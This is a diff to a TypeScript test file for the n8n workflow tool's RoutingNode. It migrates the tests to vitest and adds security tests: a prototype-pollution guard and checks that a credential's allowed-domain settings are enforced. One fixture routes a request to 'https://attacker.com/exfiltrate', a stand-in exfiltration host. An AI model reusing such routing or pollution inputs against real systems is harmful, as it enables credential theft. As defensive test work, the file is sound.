@@ -1,7 +1,8 @@
-import { mock } from 'jest-mock-extended';
-import { get } from 'lodash';
+import get from 'lodash/get';
+import { Workflow, createEmptyRunExecutionData } from 'n8n-workflow';
 import type {
 	DeclarativeRestApiSettings,
+	ICredentialDataDecryptedObject,
 	IExecuteData,
 	IExecuteSingleFunctions,
 	IHttpRequestOptions,
@@ -18,10 +19,12 @@ import type {
 	IRunExecutionData,
 	ITaskDataConnections,
 	IWorkflowExecuteAdditionalData,
+	ICredentialsDecrypted,
 } from 'n8n-workflow';
-import { NodeHelpers, Workflow } from 'n8n-workflow';
+import { mock } from 'vitest-mock-extended';
 
 import * as executionContexts from '@/execution-engine/node-execution-context';
+import { DirectoryLoader } from '@/nodes-loader';
 import { NodeTypes } from '@test/helpers';
 
 import { RoutingNode } from '../routing-node';
@@ -80,28 +83,27 @@ const getExecuteSingleFunctions = (
 					},
 				};
 			},
+			async httpRequestWithAuthentication(
+				_credentialType: string,
+				requestOptions: IHttpRequestOptions,
+			): Promise<IN8nHttpFullResponse | IN8nHttpResponse> {
+				return {
+					body: {
+						headers: {},
+						statusCode: 200,
+						requestOptions,
+					},
+				};
+			},
 		}),
 	});
 
 describe('RoutingNode', () => {
 	const nodeTypes = NodeTypes();
-	const additionalData = mock<IWorkflowExecuteAdditionalData>();
-
-	test('applyDeclarativeNodeOptionParameters', () => {
-		const nodeTypes = NodeTypes();
-		const nodeType = nodeTypes.getByNameAndVersion('test.setMulti');
-
-		NodeHelpers.applyDeclarativeNodeOptionParameters(nodeType);
-
-		const options = nodeType.description.properties.find(
-			(property) => property.name === 'requestOptions',
-		);
-
-		expect(options?.options).toBeDefined;
-
-		const optionNames = options!.options!.map((option) => option.name);
-
-		expect(optionNames).toEqual(['batching', 'allowUnauthorizedCerts', 'proxy', 'timeout']);
+	const additionalData = mock<IWorkflowExecuteAdditionalData>({
+		executionId: 'test-exec-123',
+		webhookWaitingBaseUrl: 'http://localhost:5678/webhook-waiting',
+		formWaitingBaseUrl: 'http://localhost:5678/form-waiting',
 	});
 
 	describe('getRequestOptionsFromParameters', () => {
@@ -723,7 +725,7 @@ describe('RoutingNode', () => {
 		const runIndex = 0;
 		const itemIndex = 0;
 		const connectionInputData: INodeExecutionData[] = [];
-		const runExecutionData: IRunExecutionData = { resultData: { runData: {} } };
+		const runExecutionData: IRunExecutionData = createEmptyRunExecutionData();
 		const path = '';
 		const nodeType = nodeTypes.getByNameAndVersion(node.type);
 
@@ -744,14 +746,18 @@ describe('RoutingNode', () => {
 					nodeTypes,
 				});
 
-				const routingNode = new RoutingNode(
+				const executeFunctions = mock<executionContexts.ExecuteContext>();
+				Object.assign(executeFunctions, {
+					runIndex,
+					additionalData,
 					workflow,
 					node,
-					connectionInputData,
-					runExecutionData ?? null,
-					additionalData,
 					mode,
-				);
+					connectionInputData,
+					runExecutionData,
+					nodeType,
+				});
+				const routingNode = new RoutingNode(executeFunctions, nodeType);
 
 				const executeSingleFunctions = getExecuteSingleFunctions(
 					workflow,
@@ -773,6 +779,78 @@ describe('RoutingNode', () => {
 				expect(result).toEqual(testData.output);
 			});
 		}
+
+		describe('when a routed property name is an inherited object member', () => {
+			// Guard the shared prototype so a regression here cannot cascade to other tests.
+			const hadOwnCall = Object.prototype.hasOwnProperty.call(Object.prototype.toString, 'call');
+			afterEach(() => {
+				if (!hadOwnCall) {
+					delete (Object.prototype.toString as unknown as { call?: unknown }).call;
+				}
+			});
+
+			it('keeps built-in object prototypes intact', () => {
+				const nodeTypeProperties: INodeProperties = {
+					displayName: 'Value',
+					name: 'value',
+					type: 'string',
+					routing: {
+						send: {
+							property: 'toString.call',
+							type: 'body',
+							value: 'x',
+						},
+					},
+					default: '',
+				};
+				node.parameters = {};
+				nodeType.description.properties = [nodeTypeProperties];
+
+				const workflow = new Workflow({
+					nodes: workflowData.nodes,
+					connections: workflowData.connections,
+					active: false,
+					nodeTypes,
+				});
+
+				const executeFunctions = mock<executionContexts.ExecuteContext>();
+				Object.assign(executeFunctions, {
+					runIndex,
+					additionalData,
+					workflow,
+					node,
+					mode,
+					connectionInputData,
+					runExecutionData,
+					nodeType,
+				});
+				const routingNode = new RoutingNode(executeFunctions, nodeType);
+
+				const executeSingleFunctions = getExecuteSingleFunctions(
+					workflow,
+					runExecutionData,
+					runIndex,
+					node,
+					itemIndex,
+				);
+
+				const result = routingNode.getRequestOptionsFromParameters(
+					executeSingleFunctions,
+					nodeTypeProperties,
+					itemIndex,
+					runIndex,
+					path,
+					{},
+				);
+
+				// Prototype untouched; the value lands as an own property on the request body.
+				expect(Object.prototype.hasOwnProperty.call(Object.prototype.toString, 'call')).toBe(false);
+				expect(Object.prototype.toString.call([])).toBe('[object Array]');
+				expect((result?.options.body as { toString?: { call?: unknown } }).toString?.call).toBe(
+					'x',
+				);
+			});
+		});
 	});
 
 	describe('runNode', () => {
@@ -787,7 +865,7 @@ describe('RoutingNode', () => {
 				nodeType: {
 					properties?: INodeProperties[];
 					credentials?: INodeCredentialDescription[];
-					requestDefaults?: IHttpRequestOptions;
+					requestDefaults?: DeclarativeRestApiSettings.HttpRequestOptions;
 					requestOperations?: IN8nRequestOperations;
 				};
 				node: {
@@ -1822,6 +1900,159 @@ describe('RoutingNode', () => {
 				],
 			},
 			{
+				description: 'single parameter, postReceive: rootProperty, filter',
+				input: {
+					nodeType: {
+						requestDefaults: {
+							baseURL: 'http://127.0.0.1:5678',
+							url: '/test-url',
+						},
+						properties: [
+							{
+								displayName: 'JSON Data',
+								name: 'jsonData',
+								type: 'string',
+								routing: {
+									send: {
+										property: 'jsonData',
+										type: 'body',
+									},
+									output: {
+										postReceive: [
+											{
+												type: 'rootProperty',
+												properties: {
+													property: 'requestOptions',
+												},
+											},
+											{
+												type: 'rootProperty',
+												properties: {
+													property: 'body.jsonData.root',
+												},
+											},
+											{
+												type: 'filter',
+												properties: {
+													pass: '={{ $responseItem.age > 40 }}',
+												},
+											},
+										],
+									},
+								},
+								default: '',
+							},
+						],
+					},
+					node: {
+						parameters: {
+							jsonData: {
+								root: [
+									{
+										name: 'Jim',
+										age: 34,
+									},
+									{
+										name: 'James',
+										age: 44,
+									},
+								],
+							},
+						},
+					},
+				},
+				output: [
+					[
+						{
+							json: {
+								name: 'James',
+								age: 44,
+							},
+						},
+					],
+				],
+			},
+			{
+				description:
+					'single parameter, postReceive: rootProperty, filter with expression containing $credentials',
+				input: {
+					nodeType: {
+						credentials: [
+							{
+								name: 'testCredentials',
+								required: true,
+							},
+						],
+						requestDefaults: {
+							baseURL: 'http://127.0.0.1:5678',
+							url: '/test-url',
+						},
+						properties: [
+							{
+								displayName: 'JSON Data',
+								name: 'jsonData',
+								type: 'string',
+								routing: {
+									send: {
+										property: 'jsonData',
+										type: 'body',
+									},
+									output: {
+										postReceive: [
+											{
+												type: 'rootProperty',
+												properties: {
+													property: 'requestOptions',
+												},
+											},
+											{
+												type: 'rootProperty',
+												properties: {
+													property: 'body.jsonData.root',
+												},
+											},
+											{
+												type: 'filter',
+												properties: {
+													pass: "={{ $credentials.baseUrl.startsWith('https://example.com') && $responseItem.age > 40 }}",
+												},
+											},
+										],
+									},
+								},
+								default: '',
+							},
+						],
+					},
+					node: {
+						parameters: {
+							jsonData: {
+								root: [
+									{
+										name: 'Jim',
+										age: 34,
+									},
+									{
+										name: 'James',
+										age: 44,
+									},
+								],
+							},
+						},
+					},
+				},
+				output: [
+					[
+						{
+							json: {
+								name: 'James',
+								age: 44,
+							},
+						},
+					],
+				],
+			},
+			{
 				description: 'single parameter, multiple postReceive: rootProperty, setKeyValue, sort',
 				input: {
 					nodeType: {
@@ -1901,6 +2132,124 @@ describe('RoutingNode', () => {
 					],
 				],
 			},
+			{
+				description: 'single parameter, routing.request.url resolves $execution.id',
+				input: {
+					node: {
+						parameters: {
+							resource: 'executions',
+						},
+					},
+					nodeType: {
+						requestDefaults: {
+							baseURL: 'http://127.0.0.1:5678',
+						},
+						properties: [
+							{
+								displayName: 'Resource',
+								name: 'resource',
+								type: 'string',
+								routing: {
+									request: {
+										method: 'GET',
+										url: '=/{{$value}}/{{ $execution.id }}',
+									},
+								},
+								default: '',
+							},
+						],
+					},
+				},
+				output: [
+					[
+						{
+							json: {
+								headers: {},
+								statusCode: 200,
+								requestOptions: {
+									url: '/executions/test-exec-123',
+									method: 'GET',
+									headers: {},
+									qs: {},
+									body: {},
+									baseURL: 'http://127.0.0.1:5678',
+									returnFullResponse: true,
+									timeout: 300000,
+								},
+							},
+						},
+					],
+				],
+			},
+			{
+				description:
+					'options parameter with routing.request.url on selected option resolves $execution.id via $parameter',
+				input: {
+					node: {
+						parameters: {
+							operation: 'get',
+							executionId: '={{ $execution.id }}',
+						},
+					},
+					nodeType: {
+						requestDefaults: {
+							baseURL: 'http://127.0.0.1:5678',
+						},
+						properties: [
+							{
+								displayName: 'Operation',
+								name: 'operation',
+								type: 'options',
+								noDataExpression: true,
+								default: 'get',
+								options: [
+									{
+										name: 'Get',
+										value: 'get',
+										routing: {
+											request: {
+												method: 'GET',
+												url: '=/executions/{{ $parameter.executionId }}',
+											},
+										},
+									},
+								],
+							},
+							{
+								displayName: 'Execution ID',
+								name: 'executionId',
+								type: 'string',
+								default: '',
+								displayOptions: {
+									show: {
+										operation: ['get'],
+									},
+								},
+							},
+						],
+					},
+				},
+				output: [
+					[
+						{
+							json: {
+								headers: {},
+								statusCode: 200,
+								requestOptions: {
+									url: '/executions/test-exec-123',
+									method: 'GET',
+									headers: {},
+									qs: {},
+									body: {},
+									baseURL: 'http://127.0.0.1:5678',
+									returnFullResponse: true,
+									timeout: 300000,
+								},
+							},
+						},
+					],
+				],
+			},
 		];
 
 		const baseNode: INode = {
@@ -1916,9 +2265,9 @@ describe('RoutingNode', () => {
 		const runIndex = 0;
 		const itemIndex = 0;
 		const connectionInputData: INodeExecutionData[] = [];
-		const runExecutionData: IRunExecutionData = { resultData: { runData: {} } };
+		const runExecutionData: IRunExecutionData = createEmptyRunExecutionData();
 		const nodeType = nodeTypes.getByNameAndVersion(baseNode.type);
-		NodeHelpers.applyDeclarativeNodeOptionParameters(nodeType);
+		DirectoryLoader.applyDeclarativeNodeOptionParameters(nodeType);
 
 		const propertiesOriginal = nodeType.description.properties;
 
@@ -1947,15 +2296,6 @@ describe('RoutingNode', () => {
 					nodeTypes,
 				});
 
-				const routingNode = new RoutingNode(
-					workflow,
-					node,
-					connectionInputData,
-					runExecutionData ?? null,
-					additionalData,
-					mode,
-				);
-
 				const executeData = {
 					data: {},
 					node,
@@ -1963,6 +2303,18 @@ describe('RoutingNode', () => {
 				} as IExecuteData;
 
 				const executeFunctions = mock<executionContexts.ExecuteContext>();
+				Object.assign(executeFunctions, {
+					executeData,
+					inputData,
+					runIndex,
+					additionalData,
+					workflow,
+					node,
+					mode,
+					connectionInputData,
+					runExecutionData,
+				});
+
 				const executeSingleFunctions = getExecuteSingleFunctions(
 					workflow,
 					runExecutionData,
@@ -1971,10 +2323,11 @@ describe('RoutingNode', () => {
 					itemIndex,
 				);
 
-				jest.spyOn(executionContexts, 'ExecuteContext').mockReturnValue(executeFunctions);
-				jest
-					.spyOn(executionContexts, 'ExecuteSingleContext')
-					.mockReturnValue(executeSingleFunctions);
+				vi.spyOn(executionContexts, 'ExecuteSingleContext').mockImplementation(function (
+					this: executionContexts.ExecuteSingleContext,
+				) {
+					return executeSingleFunctions as never;
+				} as never);
 
 				const numberOfItems = testData.input.specialTestOptions?.numberOfItems ?? 1;
 				if (!inputData.main[0] || inputData.main[0].length !== numberOfItems) {
@@ -1984,8 +2337,8 @@ describe('RoutingNode', () => {
 					}
 				}
 
-				const workflowPackage = await import('n8n-workflow');
-				const spy = jest.spyOn(workflowPackage, 'sleep').mockReturnValue(
+				const sleepModule = await import('@n8n/utils/sleep');
+				const spy = vi.spyOn(sleepModule, 'sleep').mockReturnValue(
 					new Promise((resolve) => {
 						resolve();
 					}),
@@ -2004,7 +2357,18 @@ describe('RoutingNode', () => {
 						? testData.input.node.parameters[parameterName]
 						: (getNodeParameter(parameterName) ?? {});
 
-				const result = await routingNode.runNode(inputData, runIndex, nodeType, executeData);
+				const mockCredentials = mock<ICredentialsDecrypted>({
+					data: {
+						apiKey: 'testApiKey',
+						baseUrl: 'https://example.com',
+					},
+				});
+
+				const routingNode = nodeType.description.credentials
+					? new RoutingNode(executeFunctions, nodeType, mockCredentials)
+					: new RoutingNode(executeFunctions, nodeType);
+
+				const result = await routingNode.runNode();
 
 				if (testData.input.specialTestOptions?.sleepCalls) {
 					expect(spy.mock.calls).toEqual(testData.input.specialTestOptions?.sleepCalls);
@@ -2090,7 +2454,7 @@ describe('RoutingNode', () => {
 
 		const runIndex = 0;
 		const itemIndex = 0;
-		const runExecutionData: IRunExecutionData = { resultData: { runData: {} } };
+		const runExecutionData: IRunExecutionData = createEmptyRunExecutionData();
 		const nodeType = mock<INodeType>();
 
 		const inputData: ITaskDataConnections = {
@@ -2136,7 +2500,11 @@ describe('RoutingNode', () => {
 						node,
 						itemIndex + iteration,
 					);
-					jest.spyOn(executionContexts, 'ExecuteSingleContext').mockReturnValue(context);
+					vi.spyOn(executionContexts, 'ExecuteSingleContext').mockImplementation(function (
+						this: executionContexts.ExecuteSingleContext,
+					) {
+						return context as never;
+					} as never);
 					currentItemIndex = context.getItemIndex();
 				}
 
@@ -2145,5 +2513,155 @@ describe('RoutingNode', () => {
 				expect(currentItemIndex).toEqual(expectedItemIndex);
 			});
 		}
+	});
+
+	describe('credential allowedDomains', () => {
+		const mode = 'internal';
+		const runIndex = 0;
+		const itemIndex = 0;
+		const connectionInputData: INodeExecutionData[] = [];
+		const runExecutionData: IRunExecutionData = createEmptyRunExecutionData();
+
+		const baseNode: INode = {
+			parameters: {},
+			name: 'test',
+			type: 'test.set',
+			typeVersion: 1,
+			id: 'uuid-1234',
+			position: [0, 0],
+		};
+
+		const buildNodeType = (): INodeType => {
+			const routingNodeType = nodeTypes.getByNameAndVersion(baseNode.type);
+			routingNodeType.description = {
+				credentials: [{ name: 'testCredential', required: true }],
+				requestDefaults: { baseURL: 'https://api.example.com' },
+				properties: [
+					{
+						displayName: 'Endpoint',
+						name: 'endpoint',
+						type: 'string',
+						default: '',
+						routing: {
+							request: {
+								url: 'https://attacker.com/exfiltrate',
+							},
+						},
+					},
+				],
+			} as unknown as INodeTypeDescription;
+			return routingNodeType;
+		};
+
+		const runWithCredential = async (data: Record<string, unknown>) => {
+			const credentialData = data as unknown as ICredentialDataDecryptedObject;
+			const nodeType = buildNodeType();
+			const workflow = new Workflow({
+				nodes: [baseNode],
+				connections: {},
+				active: false,
+				nodeTypes,
+			});
+
+			const executeFunctions = mock<executionContexts.ExecuteContext>();
+			Object.assign(executeFunctions, {
+				executeData: { data: {}, node: baseNode, source: null } as IExecuteData,
+				inputData: { main: [[{ json: {} }]] } as ITaskDataConnections,
+				runIndex,
+				additionalData,
+				workflow,
+				node: baseNode,
+				mode,
+				connectionInputData,
+				runExecutionData,
+			});
+			executeFunctions.getNodeParameter.mockImplementation(() => ({}));
+
+			const executeSingleFunctions = getExecuteSingleFunctions(
+				workflow,
+				runExecutionData,
+				runIndex,
+				baseNode,
+				itemIndex,
+			);
+			const originalGetNodeParameter = executeSingleFunctions.getNodeParameter;
+			// @ts-expect-error overwriting a method
+			executeSingleFunctions.getNodeParameter = (parameterName: string) =>
+				originalGetNodeParameter(parameterName) ?? {};
+			vi.spyOn(executionContexts, 'ExecuteSingleContext').mockImplementation(function (
+				this: executionContexts.ExecuteSingleContext,
+			) {
+				return executeSingleFunctions as never;
+			} as never);
+
+			const mockCredentials = mock<ICredentialsDecrypted>({
+				id: 'cred-1',
+				name: 'Test Credential',
+				type: 'testCredential',
+				data: credentialData,
+			});
+
+			const routingNode = new RoutingNode(executeFunctions, nodeType, mockCredentials);
+			return await routingNode.runNode();
+		};
+
+		test("propagates credential allowedDomains when mode is 'domains'", async () => {
+			const result = await runWithCredential({
+				apiKey: 'testApiKey',
+				allowedHttpRequestDomains: 'domains',
+				allowedDomains: 'api.example.com',
+			});
+
+			const requestOptions = (result?.[0]?.[0]?.json as { requestOptions: IHttpRequestOptions })
+				.requestOptions;
+			expect(requestOptions.allowedDomains).toBe('api.example.com');
+		});
+
+		test("does not set allowedDomains when mode is 'all'", async () => {
+			const result = await runWithCredential({
+				apiKey: 'testApiKey',
+				allowedHttpRequestDomains: 'all',
+			});
+
+			const requestOptions = (result?.[0]?.[0]?.json as { requestOptions: IHttpRequestOptions })
+				.requestOptions;
+			expect(requestOptions.allowedDomains).toBeUndefined();
+		});
+
+		test("throws when mode is 'none'", async () => {
+			await expect(
+				runWithCredential({
+					apiKey: 'testApiKey',
+					allowedHttpRequestDomains: 'none',
+				}),
+			).rejects.toThrow('This credential is configured to prevent use within an HTTP Request node');
+		});
+
+		test("throws when mode is 'domains' but the list is empty", async () => {
+			await expect(
+				runWithCredential({
+					apiKey: 'testApiKey',
+					allowedHttpRequestDomains: 'domains',
+					allowedDomains: '   ',
+				}),
+			).rejects.toThrow('No allowed domains specified');
+		});
+
+		test("throws when mode is 'domains' but the list is missing", async () => {
+			await expect(
+				runWithCredential({
+					apiKey: 'testApiKey',
+					allowedHttpRequestDomains: 'domains',
+				}),
+			).rejects.toThrow('No allowed domains specified');
+		});
+
+		test('does not set allowedDomains when restriction field is absent', async () => {
+			const result = await runWithCredential({ apiKey: 'testApiKey' });
+
+			const requestOptions = (result?.[0]?.[0]?.json as { requestOptions: IHttpRequestOptions })
+				.requestOptions;
+			expect(requestOptions.allowedDomains).toBeUndefined();
+		});
 	});
 });
